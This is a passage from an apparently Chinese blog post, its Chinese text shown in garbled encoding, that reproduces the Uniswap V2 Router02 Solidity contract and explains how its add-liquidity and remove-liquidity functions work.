æ­¤å…‘æ¢è·¯å¾„ä¸å®œè¿‡é•¿ï¼Œè¶Šé•¿æ‰‹ç»­è´¹è¶Šé«˜ã€‚getAmountsInå‡½æ•°åŒç†\nUniswapV2Router02\nClick to see more\ncontract UniswapV2Router02 is IUniswapV2Router02 &#123;\n    using SafeMath for uint;\n\n    address public immutable override factory;\n    address public immutable override WETH;\n\n    modifier ensure(uint deadline) &#123;\n        require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n        _;\n    &#125;\n\n    constructor(address _factory, address _WETH) public &#123;\n        factory = _factory;\n        WETH = _WETH;\n    &#125;\n\n    receive() external payable &#123;\n        assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract\n    &#125;\n\n    // **** ADD LIQUIDITY ****\n    function _addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin\n    ) internal virtual returns (uint amountA, uint amountB) &#123;\n        // create the pair if it doesn't exist yet\n        if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123;\n            IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n        &#125;\n        (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n        if (reserveA == 0 &amp;&amp; reserveB == 0) &#123;\n            (amountA, amountB) = (amountADesired, amountBDesired);\n        &#125; else &#123;\n            uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n            if (amountBOptimal &lt;= amountBDesired) &#123;\n                require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n                (amountA, amountB) = (amountADesired, amountBOptimal);\n            &#125; else &#123;\n                uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n                assert(amountAOptimal &lt;= amountADesired);\n                require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n                (amountA, amountB) = (amountAOptimal, amountBDesired);\n            &#125;\n        &#125;\n    &#125;\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123;\n        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n        liquidity = IUniswapV2Pair(pair).mint(to);\n    &#125;\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) &#123;\n        (amountToken, amountETH) = _addLiquidity(\n            token,\n            WETH,\n            amountTokenDesired,\n            msg.value,\n            amountTokenMin,\n            amountETHMin\n        );\n        address pair = UniswapV2Library.pairFor(factory, token, WETH);\n        TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);\n        IWETH(WETH).deposit&#123;value: amountETH&#125;();\n        assert(IWETH(WETH).transfer(pair, amountETH));\n        liquidity = IUniswapV2Pair(pair).mint(to);\n        // refund dust eth, if any\n        if (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n    &#125;\n\n    // **** REMOVE LIQUIDITY ****\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123;\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n        (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n        (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);\n        (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);\n        require(amountA >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n        require(amountB >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n    &#125;\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) public virtual override ensure(deadline) returns (uint amountToken, uint amountETH) &#123;\n        (amountToken, amountETH) = removeLiquidity(\n            token,\n            WETH,\n            liquidity,\n            amountTokenMin,\n            amountETHMin,\n            address(this),\n            deadline\n        );\n        TransferHelper.safeTransfer(token, to, amountToken);\n        IWETH(WETH).withdraw(amountETH);\n        TransferHelper.safeTransferETH(to, amountETH);\n    &#125;\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external virtual override returns (uint amountA, uint amountB) &#123;\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        uint value = approveMax ? uint(-1) : liquidity;\n        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n        (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);\n    &#125;\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external virtual override returns (uint amountToken, uint amountETH) &#123;\n        address pair = UniswapV2Library.pairFor(factory, token, WETH);\n        uint value = approveMax ? uint(-1) : liquidity;\n        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n        (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline);\n    &#125;\n\n    // **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) ****\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) public virtual override ensure(deadline) returns (uint amountETH) &#123;\n        (, amountETH) = removeLiquidity(\n            token,\n            WETH,\n            liquidity,\n            amountTokenMin,\n            amountETHMin,\n            address(this),\n            deadline\n        );\n        TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));\n        IWETH(WETH).withdraw(amountETH);\n        TransferHelper.safeTransferETH(to, amountETH);\n    &#125;\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external virtual override returns (uint amountETH) &#123;\n        address pair = UniswapV2Library.pairFor(factory, token, WETH);\n        uint value = approveMax ? uint(-1) : liquidity;\n        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n        amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(\n            token, liquidity, amountTokenMin, amountETHMin, to, deadline\n        );\n    &#125;\n\n    // **** SWAP ****\n    // requires the initial amount to have already been sent to the first pair\n    function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            uint amountOut = amounts[i + 1];\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));\n            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n            IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(\n                amount0Out, amount1Out, to, new bytes(0)\n            );\n        &#125;\n    &#125;\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    &#125;\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    &#125;\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n    &#125;\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    &#125;\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    &#125;\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= msg.value, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n        // refund dust eth, if any\n        if (msg.value > amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);\n    &#125;\n\n    // **** SWAP (supporting fee-on-transfer tokens) ****\n    // requires the initial amount to have already been sent to the first pair\n    function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output));\n            uint amountInput;\n            uint amountOutput;\n            &#123; // scope to avoid stack too deep errors\n            (uint reserve0, uint reserve1,) = pair.getReserves();\n            (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n            amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);\n            amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput);\n            &#125;\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));\n            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n            pair.swap(amount0Out, amount1Out, to, new bytes(0));\n        &#125;\n    &#125;\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) &#123;\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n        );\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    &#125;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        uint amountIn = msg.value;\n        IWETH(WETH).deposit&#123;value: amountIn&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn));\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    &#125;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        ensure(deadline)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n        );\n        _swapSupportingFeeOnTransferTokens(path, address(this));\n        uint amountOut = IERC20(WETH).balanceOf(address(this));\n        require(amountOut >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).withdraw(amountOut);\n        TransferHelper.safeTransferETH(to, amountOut);\n    &#125;\n\n    // **** LIBRARY FUNCTIONS ****\n    function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) &#123;\n        return UniswapV2Library.quote(amountA, reserveA, reserveB);\n    &#125;\n\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)\n        public\n        pure\n        virtual\n        override\n        returns (uint amountOut)\n    &#123;\n        return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);\n    &#125;\n\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)\n        public\n        pure\n        virtual\n        override\n        returns (uint amountIn)\n    &#123;\n        return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);\n    &#125;\n\n    function getAmountsOut(uint amountIn, address[] memory path)\n        public\n        view\n        virtual\n        override\n        returns (uint[] memory amounts)\n    &#123;\n        return UniswapV2Library.getAmountsOut(factory, amountIn, path);\n    &#125;\n\n    function getAmountsIn(uint amountOut, address[] memory path)\n        public\n        view\n        virtual\n        override\n        returns (uint[] memory amounts)\n    &#123;\n        return UniswapV2Library.getAmountsIn(factory, amountOut, path);\n    &#125;\n&#125;\n\n\n\nAnalyzeæ·»åŠ æµåŠ¨æ€§ï¼š\nfunction _addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) &#123;\n    // create the pair if it doesn't exist yet\n    if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123;\n        IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n    &#125;\n    (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n    if (reserveA == 0 &amp;&amp; reserveB == 0) &#123;\n        (amountA, amountB) = (amountADesired, amountBDesired);\n    &#125; else &#123;\n        uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n        if (amountBOptimal &lt;= amountBDesired) &#123;\n            require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n            (amountA, amountB) = (amountADesired, amountBOptimal);\n        &#125; else &#123;\n            uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n            assert(amountAOptimal &lt;= amountADesired);\n            require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n            (amountA, amountB) = (amountAOptimal, amountBDesired);\n        &#125;\n    &#125;\n&#125;\nfunction addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123;\n    (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n    TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n    liquidity = IUniswapV2Pair(pair).mint(to);\n&#125;\nfunction addLiquidityETH(\n    address token,\n    uint amountTokenDesired,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline\n) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) &#123;\n    (amountToken, amountETH) = _addLiquidity(\n        token,\n        WETH,\n        amountTokenDesired,\n        msg.value,\n        amountTokenMin,\n        amountETHMin\n    );\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);\n    IWETH(WETH).deposit&#123;value: amountETH&#125;();\n    assert(IWETH(WETH).transfer(pair, amountETH));\n    liquidity = IUniswapV2Pair(pair).mint(to);\n    // refund dust eth, if any\n    if (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n&#125;\n\nè¯¥éƒ¨åˆ†å‡½æ•°å®žçŽ°äº†æ·»åŠ æµåŠ¨æ€§åŠŸèƒ½ï¼Œæ”¯ä»˜ä¸¤ç§Tokenæ¢å–LP Tokenï¼Œå…¶ä¸­addLiquidityå’ŒaddLiquidityETHå‡½æ•°æœ‰æ‰€ä¸åŒï¼Œå‰è€…æ”¯æŒä¸¤ç§ERC-20Tokenæ·»åŠ æµåŠ¨æ€§ï¼ŒåŽè€…çš„ä¸¤ä¸ªä»£å¸ä¸­å¿…é¡»æœ‰ä¸€ä¸ªä¸ºETH\naddLiquidityå‚æ•°æ³¨é‡Šï¼š\ntokenA å’Œ tokenB å°±æ˜¯é…å¯¹çš„ä¸¤ä¸ªä»£å¸ï¼ŒamountADesiredå’ŒamountBDesiredæ˜¯é¢„æœŸå‡†å¤‡ä¸ºæ·»åŠ æµåŠ¨æ€§ä»˜å‡ºçš„Tokenæ•°é‡ï¼ŒamountAMinå’ŒamountBMinæ˜¯ç”¨æˆ·å¯ä»¥æŽ¥å—çš„æœ€å°äº¤æ˜“æ•°é‡ï¼ˆæ ¹æ®æ»‘ç‚¹è®¡ç®—ï¼‰ï¼Œtoæ˜¯LP-Tokençš„æŽ¥æ”¶åœ°å€ï¼Œdeadlineæ˜¯è¿™ç¬”äº¤æ˜“çš„æœ‰æ•ˆæœŸï¼Œè¶…è¿‡æœ‰æ•ˆæœŸè¿˜æ²¡æœ‰äº¤æ˜“å°±ä¼šç›´æŽ¥å¤±æ•ˆ\naddLiquidityå‡½æ•°è°ƒç”¨å†…éƒ¨å‡½æ•°_addLiquidityé¦–å…ˆæ£€æµ‹å¯¹åº”çš„pairæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æžœä¸å­˜åœ¨è¿›è¡Œpairåˆ›å»ºã€‚èŽ·å¾—ä¸¤ç§Tokençš„å‚¨å¤‡é‡ï¼Œå¦‚æžœä¸º0ï¼Œé‚£(amountA, amountB) &#x3D; (amountADesired, amountBDesired)ï¼Œå¦‚æžœä¸éƒ½ä¸º0å°±è®¡ç®—amountBOptimalï¼Œæ¯”è¾ƒæ˜¯å¦å°äºŽamountBDesiredå¦‚æžœå°äºŽåˆ™éœ€è¦æ»¡è¶³amountBOptimal &gt;&#x3D; amountBMinï¼Œæ­¤æ—¶(amountA, amountB) &#x3D; (amountADesired, amountBOptimal)ï¼Œå¦‚æžœamountBOptimal &gt; amountBDesiredå°±è®¡ç®—amountAOptimalï¼Œè¦æ±‚amountAOptimal &lt;&#x3D; amountADesiredå¹¶ä¸”amountAOptimal &gt;&#x3D; amountAMinå¦åˆ™å›žæ»šäº¤æ˜“ï¼Œå¦‚æžœæ»¡è¶³ï¼Œæ­¤æ—¶çš„(amountA, amountB) &#x3D; (amountAOptimal, amountBDesired)\næœ€åŽå†è°ƒç”¨pairåˆçº¦ä¸‹çš„çš„mintå‡½æ•°å°±å¯ä»¥å¾—åˆ° LP-Tokenäº†\naddLiquidityETHä¸ŽaddLiquidityé€»è¾‘ç±»ä¼¼ï¼Œä¸è¿‡å°±æ˜¯å°†ä¸€ä¸ªERC-20å˜æˆäº†ETHï¼Œã€‚é¢„æœŸæ”¯ä»˜çš„ ETH é‡‘é¢ä¹Ÿæ˜¯ç›´æŽ¥ä»Ž msg.value è¯»å–çš„ï¼Œæ‰€ä»¥å…¥å‚é‡Œä¹Ÿä¸éœ€è¦ ETH çš„ Desired å‚æ•°ï¼Œå®žé™…ä¸Šè¿™é‡Œçš„ETHä¹Ÿæ˜¯è½¬å˜ä¸ºWETHè¿›è¡Œè¾“å…¥çš„\nIWETH(WETH).deposit&#123;value: amountETH&#125;();\n\nè¿™è¡Œä»£ç å°†ç”¨æˆ·çš„EThè½¬å˜ä¸ºäº†WETH\nif (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n\nå°†ç”¨æˆ·ä»˜å‡ºçš„å¤šä½™çš„ETHè¿›è¡Œå›žé€€\nç§»é™¤æµåŠ¨æ€§ï¼š\nfunction removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123;\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n    (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n    (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);\n    (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);\n    require(amountA >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n    require(amountB >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n&#125;\nfunction removeLiquidityETH(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountToken, uint amountETH) &#123;\n    (amountToken, amountETH) = removeLiquidity(\n        token,\n        WETH,\n        liquidity,\n        amountTokenMin,\n        amountETHMin,\n        address(this),\n        deadline\n    );\n    TransferHelper.safeTransfer(token, to, amountToken);\n    IWETH(WETH).withdraw(amountETH);\n    TransferHelper.safeTransferETH(to, amountETH);\n&#125;\nfunction removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountA, uint amountB) &#123;\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);\n&#125;\nfunction removeLiquidityETHWithPermit(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountToken, uint amountETH) &#123;\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline);\n&#125;\n\n// **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) ****\nfunction removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountETH) &#123;\n    (, amountETH) = removeLiquidity(\n        token,\n        WETH,\n        liquidity,\n        amountTokenMin,\n        amountETHMin,\n        address(this),\n        deadline\n    );\n    TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));\n    IWETH(WETH).withdraw(amountETH);\n    TransferHelper.safeTransferETH(to, amountETH);\n&#125;\nfunction removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountETH) &#123;\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(\n        token, liquidity, amountTokenMin, amountETHMin, to, deadline\n    );\n&#125;\n\nremoveLiquidityå’ŒaddLiquidity å¯¹åº”ï¼Œæ¢å›žä¸¤ç§Tokenï¼ŒremoveLiquidityETHå’ŒaddLiquidityETH ï¼Œæ¢å›žTokenå’ŒETHï¼ŒremoveLiquidityWithPermitå’ŒremoveLiquidityETHWithPermitæ˜¯ä½¿ç”¨permitè¿›è¡Œç­¾åæŽˆæƒæ¢å›žTokenï¼ŒåŽè€…å…¶ä¸­ä¹‹ä¸€ä¸ºETHï¼ŒremoveLiquidityETHSupportingFeeOnTransferTokenså’ŒremoveLiquidityETHWithPermitSupportingFeeOnTransferTokenså‡½æ•°ç±»ä¼¼ï¼Œç±»ä¼¼äºŽremoveLiquidityETH ï¼Œä¸åŒä¹‹å¤„åœ¨äºŽæ”¯æŒåœ¨è½¬è´¦æ—¶æ”¯ä»˜è´¹ç”¨çš„Token(ERC865)ï¼ŒåŽè€…åŒºåˆ«å‰è€…æ”¯æŒä½¿ç”¨é“¾ä¸‹ç­¾åçš„æ–¹å¼è¿›è¡ŒæŽˆæƒ\nç§»é™¤æµåŠ¨æ€§çš„æ ¸å¿ƒä»£ç ä¸ºremoveLiquidity \nfunction removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123;\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n    (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n    (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);\n    (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);\n    require(amountA >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n    require(amountB >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n&#125;\n\né€»è¾‘æ¯”è¾ƒç®€å•ï¼Œé¦–å…ˆå°†LP-Tokenåˆ’è½¬åˆ°pairåˆçº¦ä¸‹ï¼Œåœ¨è°ƒç”¨burnå‡½æ•°é”€æ¯æµåŠ¨æ€§åŒæ—¶å½’è¿˜Token0å’ŒToken1ï¼ŒåŒæ—¶è¿”å›žamountA å’Œ amountBï¼Œç„¶åŽæŽ’åºToken0å’ŒToken1ä»Žè€Œç¡®å®šamountA å’Œ 